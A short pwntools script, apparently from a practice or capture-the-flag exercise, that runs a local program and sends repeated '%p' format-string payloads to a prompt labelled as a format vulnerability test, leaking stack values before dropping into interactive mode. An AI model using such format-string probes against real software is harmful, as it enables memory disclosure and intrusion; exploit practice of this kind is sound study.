import subprocess
import time
from pwn import *
# Start the program as a subprocess
p=process('main.py')
context.log_level='debug'
p.recvuntil(b'And, what do you want to go? ')
p.sendline(b'vulnhub')
p.recvuntil(b'string format vuln testing: ')
# gdb.attach(p,'b printf')
# pause()

p.sendline(b'-%p'*100)
output=p.recvuntil(b'string format vuln testing: ')
# print(output)

p.sendline(b'-%p'*80)
output=p.recvuntil(b'string format vuln testing: ')
# print(output)
# p.sendline(b'%18$p-%19$p')
# output=p.recvuntil(b'string format vuln testing: ')
# print(output)

# p.sendline(b'fredghy')
# output=p.recvuntil(b'string format vuln testing: ')
# print(output)
p.interactive()

